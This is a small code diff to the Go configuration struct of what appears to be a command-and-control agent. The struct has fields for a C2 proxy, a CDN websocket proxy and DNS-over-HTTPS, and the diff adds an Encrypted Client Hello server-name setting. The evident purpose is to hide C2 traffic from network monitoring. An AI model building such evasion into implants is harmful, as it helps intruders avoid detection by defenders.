@@ -112,6 +112,7 @@ type Config struct {
 	C2TransportProxy string `cbor:"26,keyasint"` // proxy for C2 transport
 	CDNProxy         string `cbor:"27,keyasint"` // websocket proxy, see go-cdn2proxy
 	DoHServer        string `cbor:"28,keyasint"` // DNS over HTTPS server, for name resolving
+	ECHServerName    string `cbor:"36,keyasint"` // DNS name whose HTTPS RR carries the ECH config (empty disables ECH)
 
 	// Per-agent identity. AgentUUID is assigned by the builder; AgentTag and
 	// AgentUUIDSig are derived from it at runtime for C2 identification.
